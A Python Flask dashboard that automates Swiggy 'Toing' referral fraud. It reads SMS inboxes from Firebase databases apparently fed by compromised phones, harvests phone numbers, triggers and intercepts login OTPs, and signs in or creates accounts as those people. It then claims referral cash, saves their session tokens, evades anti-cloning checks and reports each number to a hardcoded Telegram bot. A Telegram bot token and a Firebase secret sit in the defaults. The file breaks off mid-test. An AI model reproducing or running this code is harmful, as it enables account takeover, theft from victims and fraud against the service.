#!/usr/bin/env python3
"""
Toing referral dashboard - automated, Gold-Drop-style.

New standalone tool. api_bot.py is untouched.

Flow per number (fully automatic):
  1. Scan Firebase DBs -> devices -> phone numbers.
  2. Skip a device completely if its inbox has ANY Toing message on ANY date.
  3. Send Swiggy OTP directly (proxy only for Swiggy/Toing API calls).
  4. Poll the device inbox for the 6-digit OTP.
  5. verify -> login_check -> signup only if registered is False ->
     intrigue + reveal with the active referral code.
  6. REFERRAL CASH EARNED -> save session JSON, send Telegram (device id,
     number, db), count toward the target.
  7. ALREADY CLAIMED -> log only. REFERRED -> save session, no count.
  8. When cash wins reach the target, stop all workers and clear instances.

Usage:
  python toing_dashboard.py                 dashboard on PORT (default 5004)
  python toing_dashboard.py --dry-run       offline verification
"""

import os
import sys
import re
import json
import time
import random
import threading
import signal
import base64
import html
import urllib.parse

import requests
import urllib3
from flask import Flask, render_template, request, jsonify, redirect, url_for

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

# ─── Data directory (Railway volume) ───────────────────────────────────────
DATA_DIR = os.environ.get("DATA_DIR", os.getcwd())
os.makedirs(DATA_DIR, exist_ok=True)


def data_path(name):
    return os.path.join(DATA_DIR, name)


SETTINGS_FILE = data_path("settings.json")
LINKS_FILE = data_path("firebase_links.json")
STATS_FILE = data_path("stats.json")
HITS_DIR = data_path("hits")
os.makedirs(HITS_DIR, exist_ok=True)

BASE = "https://profile.swiggy.com"
IST = __import__("datetime").timezone(__import__("datetime").timedelta(hours=5, minutes=30))

# ─── Defaults / sections ──────────────────────────────────────────────────
DEFAULTS = {
    # proxy (Swiggy/Toing API only)
    "proxy": "",
    "ssl_verify": True,
    # telegram
    "tg_bot_token": "6908653973:AAEYy_bhVTY1y2OVwYhM2RfCU4m10chXeV0",
    "tg_chat_id": "1007758627",
    # referral
    "referral_code": "11656E9C",
    "campaign_id": "ToingCampaign",
    "referrer_name": "Barshan",
    "account_name": "Ankan",
    "referral_codes": [
        {"code": "11656E9C", "referrer_name": "Barshan", "campaign_id": "ToingCampaign"}
    ],
    # firebase
    "firebase_secret": "rolex",
    "firebase_timeout": 8,
    # device filter: "online" or "both"
    "device_filter": "online",
    # runtime
    "otp_timeout": 30,
    "otp_interval": 3,
    "request_timeout": 45,
    "sms_limit": 400,
}

SECTIONS = {
    "proxy": ["proxy", "ssl_verify"],
    "telegram": ["tg_bot_token", "tg_chat_id"],
    "referral": ["referral_code", "campaign_id", "referrer_name", "account_name"],
    "firebase": ["firebase_secret", "firebase_timeout", "device_filter"],
    "runtime": ["otp_timeout", "otp_interval", "request_timeout", "sms_limit"],
}

# ─── Globals ──────────────────────────────────────────────────────────────
app = Flask(__name__)
logs = []
hits = []
logs_lock = threading.Lock()
hits_lock = threading.Lock()
stats_lock = threading.Lock()
links_lock = threading.Lock()
settings_lock = threading.Lock()
INSTANCE_LOCK = threading.Lock()
RUNNING_FLAGS = {}
ACTIVE_THREADS = {}
INSTANCES = []
STOP_REQUESTED = threading.Event()
RUN_TARGET = 0  # accounts needed for the current run; set at Start, cleared at Stop
RUN_LINKS = []  # shuffled Firebase order for the current run

LOG_COLORS = {
    "INFO": "\x1b[90m",      # grey
    "ERROR": "\x1b[91m",     # red
    "WIN": "\x1b[92m",       # green - cash earned
    "ALREADY": "\x1b[93m",   # amber - already claimed
    "SKIP": "\x1b[95m",      # violet - device skipped (Toing SMS)
    "OTP": "\x1b[96m",       # cyan - OTP received
    "OTPFAIL": "\x1b[31m",   # bright red - OTP not received / failed
    "HIT": "\x1b[96m",       # cyan - generic hit
    "NOREWARD": "\x1b[93m",
}
ANSI_RESET = "\x1b[0m"


# ─── Settings ─────────────────────────────────────────────────────────────
def load_settings():
    with settings_lock:
        try:
            if os.path.exists(SETTINGS_FILE):
                with open(SETTINGS_FILE, "r", encoding="utf-8") as handle:
                    data = json.load(handle)
                if isinstance(data, dict):
                    return data
        except Exception:
            pass
    return {}


def save_settings(data):
    with settings_lock:
        with open(SETTINGS_FILE, "w", encoding="utf-8") as handle:
            json.dump(data, handle, indent=2, ensure_ascii=False)


def get_setting(key, cast=None):
    value = load_settings().get(key, DEFAULTS.get(key))
    if value is None:
        value = DEFAULTS.get(key)
    if cast is int:
        try:
            return int(value)
        except (TypeError, ValueError):
            return int(DEFAULTS.get(key, 0))
    if cast is bool:
        if isinstance(value, bool):
            return value
        return str(value).strip().lower() in ("1", "true", "yes", "on")
    if cast is list:
        if isinstance(value, list):
            return value
        if isinstance(value, str):
            return [x.strip() for x in re.split(r"[,\n]+", value) if x.strip()]
        return list(DEFAULTS.get(key, []))
    return value


def reset_section(section):
    if section not in SECTIONS:
        return False
    data = load_settings()
    for key in SECTIONS[section]:
        data[key] = DEFAULTS[key]
    save_settings(data)
    return True


# ─── Logging ──────────────────────────────────────────────────────────────
def log(msg, level="INFO"):
    # Keep each event on a single line -- long SMS text must not wrap the log.
    flat = " ".join(str(msg).split())
    entry = "[%s] [%s] %s" % (datetime_now_str(), level, flat)
    color = LOG_COLORS.get(level, "")
    if color and sys.stdout.isatty():
        print(color + entry + ANSI_RESET, flush=True)
    else:
        print(entry, flush=True)
    with logs_lock:
        logs.append(entry)
        if len(logs) > 2000:
            logs.pop(0)


from datetime import datetime, timedelta
def datetime_now_str():
    return datetime.now(IST).strftime("%H:%M:%S")


def today_key():
    return datetime.now(IST).strftime("%Y-%m-%d")


# ─── Stats ────────────────────────────────────────────────────────────────
def load_stats():
    """Caller holds stats_lock; never acquire it here (non-reentrant Lock)."""
    try:
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, "r", encoding="utf-8") as handle:
                data = json.load(handle)
            if isinstance(data, dict):
                return data
    except Exception:
        pass
    return {}


def today_stats():
    data = load_stats()
    base = {"tries": 0, "cash": 0, "referred": 0, "already": 0,
            "otp_fail": 0, "otp_timeout": 0, "skipped_devices": 0,
            "skipped_dbs": 0, "skipped_offline": 0}
    base.update(data.get(today_key(), {}))
    return base


def record(outcome):
    with stats_lock:
        data = load_stats()
        key = today_key()
        entry = data.setdefault(key, {"tries": 0, "cash": 0, "referred": 0,
                                      "already": 0, "otp_fail": 0,
                                      "otp_timeout": 0, "skipped_devices": 0,
                                      "skipped_dbs": 0, "skipped_offline": 0})
        if outcome in entry:
            entry[outcome] = int(entry.get(outcome, 0)) + 1
        else:
            entry["tries"] = int(entry.get("tries", 0)) + 1
        for old in sorted(data.keys())[:-7]:
            data.pop(old, None)
        with open(STATS_FILE, "w", encoding="utf-8") as handle:
            json.dump(data, handle, indent=2)


def target_reached():
    return RUN_TARGET > 0 and int(today_stats().get("cash", 0)) >= RUN_TARGET


# ─── Firebase links ───────────────────────────────────────────────────────
def parse_links(raw):
    urls = []
    if isinstance(raw, list):
        raw = "\n".join(str(x) for x in raw)
    for line in str(raw or "").splitlines():
        line = line.strip()
        if not line:
            continue
        if line.upper().startswith("URL:"):
            line = line.split(":", 1)[1].strip()
        line = line.rstrip("/")
        if line.startswith("http") and line not in urls:
            urls.append(line)
    return urls


def load_links():
    with links_lock:
        try:
            if os.path.exists(LINKS_FILE):
                with open(LINKS_FILE, "r", encoding="utf-8") as handle:
                    data = json.load(handle)
                if isinstance(data, list):
                    return [str(x) for x in data]
        except Exception:
            pass
    return []


def save_links(urls):
    with links_lock:
        with open(LINKS_FILE, "w", encoding="utf-8") as handle:
            json.dump(urls, handle, indent=2)


def clients_url(db):
    secret = urllib.parse.quote(str(get_setting("firebase_secret", str)))
    return db.rstrip("/") + "/clients.json?auth=" + secret


def messages_url(db, device_id, limit=None):
    limit = limit or get_setting("sms_limit", int)
    secret = urllib.parse.quote(str(get_setting("firebase_secret", str)))
    return (db.rstrip("/") + "/messages/" + device_id +
            ".json?auth=" + secret + "&orderBy=%22%24key%22&limitToLast=" + str(limit))


def fb_get(url):
    try:
        r = requests.get(url, timeout=get_setting("firebase_timeout", int))
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None


# ─── Telegram (direct, no proxy) ──────────────────────────────────────────
def send_telegram(message):
    try:
        token = get_setting("tg_bot_token", str)
        chat = get_setting("tg_chat_id", str)
        r = requests.post("https://api.telegram.org/bot%s/sendMessage" % token,
                          json={"chat_id": chat, "text": message[:4000],
                                "parse_mode": "HTML",
                                "disable_web_page_preview": True}, timeout=15)
        return r.status_code == 200
    except Exception as exc:
        log("TG error: %s" % exc, "ERROR")
        return False


# ─── Toing API helpers (proxy applies HERE only) ─────────────────────────
def swiggy_call(method, url, headers, body=None):
    proxy = get_setting("proxy", str).strip()
    proxies = {"http": proxy, "https": proxy} if proxy else None
    kwargs = {
        "headers": headers,
        "timeout": get_setting("request_timeout", int),
        "proxies": proxies,
        "verify": get_setting("ssl_verify", bool),
    }
    if body is not None:
        kwargs["json"] = body
    try:
        r = requests.request(method, url, **kwargs)
        return r.status_code, r.text
    except Exception as exc:
        return None, "%s: %s" % (type(exc).__name__, exc)


def new_device():
    return "".join(random.choice("0123456789abcdef") for _ in range(16))


def base_headers(dev, tid="", sid=""):
    return {
        "manufacturer": "GOOGLE",
        "model-name": "SDK_GPHONE64_X86_64",
        "pl-version": "146",
        "user-agent": "Swiggy-Android",
        "tid": tid,
        "sid": sid,
        "x-device-width": "411",
        "x-device-height": "842",
        "version-code": "1877",
        "app-version": "4.121.2",
        "latitude": "0.0",
        "longitude": "0.0",
        "os-version": "14",
        "accessibility_enabled": "false",
        "x-device-frame": "UNKNOWN",
        "x-device-memory": "UNKNOWN",
        "x-device-network": "UNKNOWN",
        "swuid": dev,
        "deviceid": dev,
        "x-network-quality": "GOOD",
        "faw-flags": "1354",
        "accept": "application/json; charset=utf-8",
        "content-type": "application/json; charset=utf-8",
        "x-channel": "toing-app",
        "category": "food",
    }


def signals():
    return {"appFilesDirPathInvalid": 0, "developerModeEnabled": 0,
            "deviceModelVmos": 0, "emulatorStatus": 0,
            "packageName": "in.swiggy.android.toing", "workProfileEnabled": 0}


def j(raw):
    try:
        return json.loads(raw)
    except Exception:
        return {}


def extract_user_id(tid):
    if not tid:
        return None
    try:
        payload = tid.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        d = json.loads(base64.urlsafe_b64decode(payload).decode("utf-8", "replace"))
        uid = d.get("user_id") or d.get("userId")
        if uid:
            return uid
        m = re.search(r"userId~(\d+)", d.get("sub", ""))
        return m.group(1) if m else None
    except Exception:
        return None


def verdict(intrigue_raw, reveal_raw):
    it = j(intrigue_raw).get("data", {}).get("intrigue_data", {}) or {}
    rvj = j(reveal_raw)
    rv = rvj.get("data", {}).get("error_data", {}) or {}
    title, rtitle = it.get("title") or "", rv.get("title") or ""
    if "already claimed" in rtitle.lower():
        return "ALREADY CLAIMED", it, rv
    if "own link" in rtitle.lower():
        return "OWN CODE", it, rv
    if " has referred you" in title:
        return "REFERRED: " + title.replace(" has referred you!", ""), it, rv
    if rvj.get("statusCode") == 0 and not rtitle:
        return "REFERRAL CASH EARNED (₹50)", it, rv
    return "UNKNOWN - inspect raw", it, rv


# ─── Device / inbox helpers ───────────────────────────────────────────────
PHONE_PATTERNS = [
    re.compile(r"(?:Jio|JIO|Airtel|AIRTEL|Vi|VI|Vodafone|BSNL)\s+(?:Number|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})", re.I),
    re.compile(r"(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*(?:\+?91[-\s]?)([6-9][0-9]{9})", re.I),
    re.compile(r"Number\s*[:\-]\s*([6-9][0-9]{9})", re.I),
    re.compile(r"(\+91[-\s]?[6-9][0-9]{9})"),
    re.compile(r"(?:\b91)([6-9][0-9]{9})\b"),
    re.compile(r"(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)"),
]


def msg_text(msg):
    return str(msg.get("message", "") or msg.get("body", "") or msg.get("text", "") or "")


def msg_sender(msg):
    return str(msg.get("sender", "") or msg.get("from", "") or "")


def is_online_device(dev):
    """Panel definition: status is true / 1 / 'true' / 'online'."""
    v = dev.get("status")
    if v is True or v == 1:
        return True
    return isinstance(v, str) and v.strip().lower() in ("true", "online")


def is_toing_message(msg):
    """Skip rule only: the MESSAGE BODY must contain 'toing' (sender ignored)."""
    return "toing" in msg_text(msg).lower()


def device_has_toing_message(db, device_id):
    """Any message whose BODY contains 'toing', on ANY date -> skip device."""
    data = fb_get(messages_url(db, device_id))
    if not isinstance(data, dict):
        return False, ""
    for _, msg in data.items():
        if isinstance(msg, dict) and is_toing_message(msg):
            return True, msg_text(msg)
    return False, ""


def extract_phone_from_sms(text):
    for pattern in PHONE_PATTERNS:
        m = pattern.search(text)
        if m and m.group(1):
            digits = re.sub(r"[^0-9]", "", m.group(1))
            if len(digits) == 10 and digits[0] in "6789":
                return digits
            if len(digits) == 12 and digits.startswith("91") and digits[2] in "6789":
                return digits[2:]
    return None


def device_numbers(dev, db):
    nums = []
    raw = dev.get("mobNo", "")
    if not raw or str(raw) in ("", "-", "None"):
        sims = dev.get("sims")
        if isinstance(sims, dict):
            sims = list(sims.values())
        if isinstance(sims, list) and sims and isinstance(sims[0], dict):
            raw = sims[0].get("phoneNumber", "")
    if not raw or str(raw) in ("", "-", "None"):
        raw = dev.get("phoneNumber", "")
    mobile = str(raw or "").replace("+91", "").replace(" ", "").replace("-", "").strip()
    if len(mobile) == 10 and mobile.isdigit() and mobile[0] in "6789":
        nums.append(mobile)
    return nums


def all_numbers(dev, db, device_id):
    nums = device_numbers(dev, db)
    data = fb_get(messages_url(db, device_id))
    if isinstance(data, dict):
        for _, msg in data.items():
            if isinstance(msg, dict):
                phone = extract_phone_from_sms(msg_text(msg))
                if phone and phone not in nums:
                    nums.append(phone)
    return nums


def last_msg_key(db, device_id):
    data = fb_get(messages_url(db, device_id, 1))
    if isinstance(data, dict) and data:
        return list(data.keys())[-1]
    return ""


def poll_otp(db, device_id, after_key, timeout, interval):
    deadline = time.time() + timeout
    while time.time() < deadline:
        time.sleep(interval)
        data = fb_get(messages_url(db, device_id, 20))
        if not isinstance(data, dict):
            continue
        for key, msg in data.items():
            if key <= after_key or not isinstance(msg, dict):
                continue
            text = msg_text(msg).lower()
            sender = msg_sender(msg).lower()
            # We call the Swiggy API directly, so the OTP arrives as a Swiggy
            # login SMS (sender TX-SWIGGY-S / SWGTNG). Accept either via sender
            # or a 'toing'/'otp' body — independent of the skip rule.
            looks_like_otp = (any(k in sender for k in ("swiggy", "swgtng", "toing"))
                              or "toing" in text
                              or ("otp" in text and any(k in text for k in ("login", "account", "code"))))
            if looks_like_otp:
                m = re.search(r"\b(\d{6})\b", msg_text(msg))
                if m:
                    return m.group(1)
    return None


# ─── Referral ─────────────────────────────────────────────────────────────
def active_referral():
    return {
        "code": get_setting("referral_code", str),
        "campaign_id": get_setting("campaign_id", str),
        "referrer_name": get_setting("referrer_name", str),
    }


def save_session(number, sess, db, device_id, outcome):
    path = os.path.join(HITS_DIR, "claimed_session_%s.json" % number)
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(sess, handle, indent=2, ensure_ascii=False)
    with hits_lock:
        hits.append({"number": number, "db": db, "device_id": device_id,
                     "outcome": outcome, "file": path,
                     "at": datetime.now(IST).isoformat()})
    return path


def run_number(db, device_id, phone):
    record("tries")
    dev = new_device()
    baseline = last_msg_key(db, device_id)
    h = base_headers(dev)
    st, raw = swiggy_call("GET", BASE + "/api/v3/app/sms_otp?mobile=" + phone, h)
    d = j(raw)
    if d.get("statusCode") not in (0, None):
        record("otp_fail")
        log("    [-] sms_otp failed for %s: %s" % (phone, str(d.get("statusMessage") or raw)[:180]), "OTPFAIL")
        return "OTP_FAIL"
    tid, sid = d.get("tid", ""), d.get("sid", "")
    otp = poll_otp(db, device_id, baseline,
                   get_setting("otp_timeout", int), get_setting("otp_interval", int))
    if not otp:
        record("otp_timeout")
        log("    [-] OTP not received for %s" % phone, "OTPFAIL")
        return "OTP_TIMEOUT"
    log("    [+] OTP received for %s" % phone, "OTP")

    h2 = base_headers(dev, tid, sid)
    st, raw = swiggy_call("POST", BASE + "/api/v3/app/login/verify?otp_source=Sms-automatic",
                          h2, {"cloningSignalsData": signals(), "otp": otp})
    d = j(raw)
    if d.get("statusCode") != 0:
        record("otp_fail")
        log("    [-] verify failed for %s: %s" % (phone, str(d.get("statusMessage") or raw)[:180]), "OTPFAIL")
        return "VERIFY_FAIL"
    prof = d.get("data", {}) or {}
    token = prof.get("token") or ""
    tid2 = d.get("tid") or tid
    sid2 = d.get("sid") or sid

    # Every number is checked; login_check only gates signup, never skip.
    _, raw0 = swiggy_call("GET", BASE + "/api/v2/app/login_check?mobile=" + phone, h2)
    pre_reg = j(raw0).get("data", {}).get("registered")
    log("    [*] %s login_check registered=%s" % (phone, pre_reg))
    if pre_reg is False:
        h3 = base_headers(dev, tid2, sid2)
        h3["token"] = token
        su = {"cloningSignalsData": signals(),
              "signUp": {"email": prof.get("email") or "", "mobile": phone,
                         "name": get_setting("account_name", str)}}
        _, rawsu = swiggy_call("POST", BASE + "/api/v3/app/signup", h3, su)
        sd = j(rawsu)
        log("    [*] %s signup: %s" % (phone, sd.get("statusMessage")))
        if sd.get("statusCode") == 0:
            prof = sd.get("data", {}) or prof
            token = prof.get("token") or token
            tid2 = sd.get("tid") or tid2
            sid2 = sd.get("sid") or sid2

    h4 = base_headers(dev, tid2, sid2)
    h4["token"] = token
    ref = active_referral()
    rb = {"referral_code": ref["code"], "campaign_id": ref["campaign_id"]}
    _, raw1 = swiggy_call("POST", BASE + "/api/v1/referral/intrigue", h4, rb)
    _, raw2 = swiggy_call("POST", BASE + "/api/v1/referral/reveal", h4, rb)
    v, it, rv = verdict(raw1, raw2)
    if v.startswith("REFERRAL CASH"):
        tag, word = "WIN", "EARNED"
    elif v.startswith("ALREADY"):
        tag, word = "ALREADY", "ALREADY CLAIMED"
    elif v.startswith("REFERRED"):
        tag, word = "HIT", "REFERRED"
    elif v.startswith("OWN CODE"):
        tag, word = "ALREADY", "OWN CODE"
    else:
        tag, word = "INFO", "UNKNOWN"
    log("    [%s] %s => %s | %s" % (phone, word, v,
        str(rv.get("title") or it.get("title") or "")[:140]), tag)

    if not token:
        log("    [-] no token for %s - session not saved" % phone, "ERROR")
        return v

    sess = {
        "mobile": phone,
        "name": get_setting("account_name", str),
        "token": token,
        "sid": sid2,
        "tid": tid2,
        "deviceId": dev,
        "customerId": str(prof.get("customerId") or prof.get("customer_id")
                          or extract_user_id(tid2) or ""),
    }

    if v.startswith("ALREADY"):
        record("already")
        return v
    if v.startswith("REFERRAL CASH"):
        record("cash")
        path = save_session(phone, sess, db, device_id, v)
        send_telegram(
            "🏆 <b>TOING REFERRAL CASH EARNED</b>\n"
            "📱 Number: <code>%s</code>\n"
            "📟 Device: <code>%s</code>\n"
            "🗄 DB: <code>%s</code>\n"
            "🎁 %s\n"
            "💾 Session: <code>%s</code>"
            % (phone, html.escape(device_id), html.escape(db),
               html.escape(v), html.escape(os.path.basename(path)))
        )
        log("    [+] CASH WIN %s (target %d, now %d) - session saved + TG sent"
            % (phone, RUN_TARGET, today_stats().get("cash", 0)), "WIN")
        maybe_stop()
        return v
    if v.startswith("REFERRED"):
        record("referred")
        path = save_session(phone, sess, db, device_id, v)
        log("    [~] REFERRED %s - session saved (does not count toward target): %s"
            % (phone, os.path.basename(path)), "HIT")
        return v

    return v


# ─── Workers / instances ─────────────────────────────────────────────────
def stop_all(clear=True, reset_target=True):
    STOP_REQUESTED.set()
    for key in list(RUNNING_FLAGS.keys()):
        RUNNING_FLAGS[key] = False
    if clear:
        with INSTANCE_LOCK:
            INSTANCES.clear()
    if reset_target:
        globals()["RUN_TARGET"] = 0


def maybe_stop():
    if target_reached():
        log("=== Target reached (%d cash wins) - stopping all workers and removing instances ==="
            % RUN_TARGET, "WIN")
        stop_all(clear=True)


def build_run_links(links):
    """Shuffle the full Firebase order so each run/instance sees a new mix."""
    shuffled = list(links)
    random.shuffle(shuffled)
    return shuffled


def worker(inst_id, start, end):
    RUNNING_FLAGS[inst_id] = True
    # Shuffle again inside the shard so instance 1's 40-57 is not sequential either.
    shard = list(RUN_LINKS[start:min(end, len(RUN_LINKS) - 1) + 1])
    random.shuffle(shard)
    for db in shard:
        if not RUNNING_FLAGS.get(inst_id) or STOP_REQUESTED.is_set():
            break
        log("[*] Inst %s scanning %s" % (inst_id, db))
        clients = fb_get(clients_url(db))
        if not isinstance(clients, dict) or "error" in clients or not clients:
            record("skipped_dbs")
            log("[*] Inst %s skipping inactive/deactivated DB %s" % (inst_id, db), "INFO")
            continue
        device_filter = get_setting("device_filter", str)
        for device_id, dev in clients.items():
            if not RUNNING_FLAGS.get(inst_id) or STOP_REQUESTED.is_set():
                break
            if not isinstance(dev, dict):
                continue
            if device_filter == "online" and not is_online_device(dev):
                record("skipped_offline")
                continue
            has_toing, matched_text = device_has_toing_message(db, device_id)
            if has_toing:
                record("skipped_devices")
                log("  [%s] Toing in SMS body - skipping device"
                    % device_id[:12], "SKIP")
                continue
            for phone in all_numbers(dev, db, device_id):
                if not RUNNING_FLAGS.get(inst_id) or STOP_REQUESTED.is_set():
                    break
                if target_reached():
                    break
                run_number(db, device_id, phone)
    RUNNING_FLAGS[inst_id] = False


def start_workers(count, accounts):
    global RUN_TARGET, RUN_LINKS
    links = load_links()
    if not links:
        raise RuntimeError("No Firebase links configured")
    accounts = int(accounts)
    if accounts < 1:
        raise RuntimeError("Accounts needed must be at least 1")
    stop_all(clear=True, reset_target=False)
    STOP_REQUESTED.clear()
    RUN_TARGET = accounts
    RUN_LINKS = build_run_links(links)  # new order every run
    n = max(1, min(int(count), len(RUN_LINKS)))
    chunk, rem = divmod(len(RUN_LINKS), n)
    curr = 0
    with INSTANCE_LOCK:
        for i in range(n):
            extra = 1 if i < rem else 0
            end = curr + chunk + extra - 1
            iid = str(i + 1)
            INSTANCES.append({"id": iid, "start": curr, "end": end, "status": "Running"})
            RUNNING_FLAGS[iid] = True
            t = threading.Thread(target=worker, args=(iid, curr, end), daemon=True)
            ACTIVE_THREADS[iid] = t
            t.start()
            curr = end + 1
    log("[*] Started %d instances over %d Firebase databases (target %d cash wins, order shuffled)"
        % (n, len(RUN_LINKS), RUN_TARGET), "HIT")
    return n


# ─── Dashboard routes ────────────────────────────────────────────────────
@app.route("/health")
def health():
    return jsonify({"status": "ok", "links": len(load_links()),
                    "instances": len(INSTANCES),
                    "running": sorted(k for k, v in RUNNING_FLAGS.items() if v),
                    "cash_today": today_stats().get("cash", 0),
                    "target": RUN_TARGET})


@app.route("/")
def dashboard():
    with INSTANCE_LOCK:
        instances = [dict(x) for x in INSTANCES]
    for inst in instances:
        inst["status"] = "Running" if RUNNING_FLAGS.get(inst["id"], False) else "Stopped"
    return render_template("dashboard.html", instances=instances,
                           stats=today_stats(), link_count=len(load_links()),
                           target=RUN_TARGET,
                           hit_count=len(hits), log_count=len(logs),
                           referral=get_setting("referral_code", str))


@app.route("/logs")
def logs_page():
    with logs_lock:
        return render_template("logs.html", logs=list(reversed(logs)))


@app.route("/hits")
def hits_page():
    with hits_lock:
        rows = []
        for h in reversed(hits):
            row = dict(h)
            session_text = ""
            try:
                if os.path.exists(h.get("file", "")):
                    with open(h["file"], "r", encoding="utf-8") as handle:
                        session_text = handle.read()
            except Exception:
                session_text = ""
            row["session_text"] = session_text
            rows.append(row)
        return render_template("hits.html", hits=rows)


@app.route("/firebases")
def firebases_page():
    return render_template("firebases.html", links=list(enumerate(load_links())))


@app.route("/settings")
def settings_page():
    data = dict(DEFAULTS)
    data.update(load_settings())
    return render_template("settings.html", settings=data, sections=SECTIONS)


@app.route("/api/logs")
def api_logs():
    with logs_lock:
        return jsonify(list(logs))


@app.route("/api/settings", methods=["POST"])
def api_save_settings():
    data = request.json or {}
    current = load_settings()
    for k, v in data.items():
        if k in DEFAULTS:
            current[k] = v
    save_settings(current)
    return jsonify({"status": "saved"})


@app.route("/api/settings/reset", methods=["POST"])
def api_reset_settings():
    section = (request.json or {}).get("section", "")
    return jsonify({"status": "success" if reset_section(section) else "error",
                    "section": section})


@app.route("/api/referral/add", methods=["POST"])
def api_referral_add():
    data = request.json or {}
    code = str(data.get("code", "")).strip().upper()
    campaign = str(data.get("campaign_id", "")).strip() or get_setting("campaign_id", str)
    name = str(data.get("referrer_name", "")).strip() or get_setting("referrer_name", str)
    if not code:
        return jsonify({"status": "error", "message": "Code required"})
    current = load_settings()
    codes = current.get("referral_codes", [])
    if not isinstance(codes, list):
        codes = []
    codes = [c for c in codes if not (isinstance(c, dict) and c.get("code") == code)]
    codes.append({"code": code, "campaign_id": campaign, "referrer_name": name})
    current["referral_codes"] = codes
    current["referral_code"] = code
    current["campaign_id"] = campaign
    current["referrer_name"] = name
    save_settings(current)
    log("[*] Added referral code %s (%s)" % (code, name), "HIT")
    return jsonify({"status": "success", "active": code, "total": len(codes)})


@app.route("/api/referral/use", methods=["POST"])
def api_referral_use():
    code = str((request.json or {}).get("code", "")).strip().upper()
    current = load_settings()
    codes = current.get("referral_codes", [])
    found = None
    for c in codes if isinstance(codes, list) else []:
        if isinstance(c, dict) and c.get("code") == code:
            found = c
            break
    if not found:
        return jsonify({"status": "error", "message": "Unknown saved code"})
    current["referral_code"] = found["code"]
    current["campaign_id"] = found.get("campaign_id", "")
    current["referrer_name"] = found.get("referrer_name", "")
    save_settings(current)
    return jsonify({"status": "success", "active": code})


@app.route("/api/links/add", methods=["POST"])
def api_links_add():
    url = str((request.json or {}).get("url", "")).strip().rstrip("/")
    if not url.startswith("http"):
        return jsonify({"status": "error", "message": "Enter a valid http(s) URL"})
    urls = load_links()
    if url not in urls:
        urls.append(url)
        save_links(urls)
    return jsonify({"status": "success", "count": len(urls)})


@app.route("/api/links/remove", methods=["POST"])
def api_links_remove():
    url = str((request.json or {}).get("url", "")).strip()
    urls = [u for u in load_links() if u != url]
    save_links(urls)
    return jsonify({"status": "success", "count": len(urls)})


@app.route("/api/links/save", methods=["POST"])
def api_links_save():
    urls = parse_links((request.json or {}).get("links", ""))
    save_links(urls)
    return jsonify({"status": "success", "count": len(urls)})


@app.route("/api/workers/start", methods=["POST"])
def api_workers_start():
    data = request.json or {}
    count = data.get("instances", 1)
    accounts = data.get("accounts", 0)
    try:
        n = start_workers(count, accounts)
        return jsonify({"status": "success", "instances": n, "target": RUN_TARGET})
    except Exception as exc:
        return jsonify({"status": "error", "message": str(exc)})


@app.route("/api/workers/stop", methods=["POST"])
def api_workers_stop():
    stop_all(clear=True)
    log("[*] All workers stopped and instances cleared")
    return jsonify({"status": "success"})


@app.route("/api/stats/reset", methods=["POST"])
def api_stats_reset():
    with stats_lock:
        if os.path.exists(STATS_FILE):
            os.remove(STATS_FILE)
    return jsonify({"status": "success"})


@app.route("/api/test_proxy", methods=["POST"])
def api_test_proxy():
    proxy = (request.json or {}).get("proxy", "") or get_setting("proxy", str)
    if not proxy:
        return jsonify({"status": "error", "message": "No proxy"})
    try:
        r = requests.get("https://profile.swiggy.com/",
                         proxies={"http": proxy, "https": proxy},
                         verify=get_setting("ssl_verify", bool), timeout=20)
        return jsonify({"status": "success", "http": r.status_code, "bytes": len(r.content)})
    except Exception as exc:
        return jsonify({"status": "error", "message": str(exc)})


# ─── Dry run ──────────────────────────────────────────────────────────────
def dry_run():
    log("=== DRY RUN (no network) ===")
    assert parse_links("https://a.firebaseio.com\nURL: https://b.firebaseio.com\nhttps://a.firebaseio.com") == [
        "https://a.firebaseio.com", "https://b.firebaseio.com"]
    log("Link parsing: plain + Nexus formats OK")

    i1 = j('{"data":{"intrigue_data":{"title":"Barshan has referred you!"}}}')
    r1 = j('{"statusCode":0,"data":{"error_data":{}}}')
    r2 = j('{"statusCode":400,"data":{"error_data":{"title":"Oops you already claimed this ticket!"}}}')
    assert verdict(json.dumps(i1), json.dumps(r1))[0].startswith("REFERRED")
    assert verdict(json.dumps(i1), json.dumps(r2))[0] == "ALREADY CLAIMED"
    cash = verdict(json.dumps(j('{"data":{"intrigue_data":{"title":"Welcome"}}}')),
                   json.dumps(j('{"statusCode":0,"data":{"error_data":{}}}')))[0]
    assert cash.startswith("REFERRAL CASH")
    log("Verdict: cash / already / referred classified")

    assert is_toing_message({"sender": "VM-SWGTNG-S", "message": "Use OTP 123456 to log into your Toing account."})
    assert not is_toing_message({"sender": "TX-SWIGGY-S", "message": "This is a Swiggy login OTP 123456."})
    assert not is_toing_message({"sender": "VM-SWGTNG-S", "message": "Your order is on the way."})
    assert re.search(r"\b(\d{6})\b", "Use OTP 738170 to log into your Toing account").group(1) == "738170"

    sample = ["db%d" % i for i in range(30)]
    s1 = build_run_links(sample)
    s2 = build_run_links(sample)
    assert sorted(s1) == sorted(sample) and len(s1) == len(sample), "shuffle must keep all links"
    assert s1 != sample and s2 != sample, "order should change"
    log("Firebase shuffle: full order + per-shard randomness")

    for v in (True, 1, "true", "online", "ONLINE"):
        assert is_online_device({"status": v}), v
    for v in (False, 0, "false", "offline", None, ""):
        assert not is_online_device({"status": v}), v
    assert get_setting("device_filter", str) == "online"
    log("Device filter: online-only / both, status detection OK")

    h = base_headers(new_device(), "tid", "sid")
    for key in ("swuid", "deviceid", "latitude", "longitude", "token"):  # token is added later
        if key != "token":
            assert key in h
    assert len(new_device()) == 16
    log("Headers + device id OK")

    old_target = RUN_TARGET
    try:
        globals()["RUN_TARGET"] = 0
        assert not target_reached(), "no target should never be reached"
        globals()["RUN_TARGET"] = 999
        assert not target_reached(), "target 999 should not be reached"
    finally:
        globals()["RUN_TARGET"] = old_target
    assert set(SECTIONS["referral"]) <= set(DEFAULTS)
    log("Per-run target: set at Start, no persistent default")

    links = ["db%d" % i for i in range(23)]
    n = 7
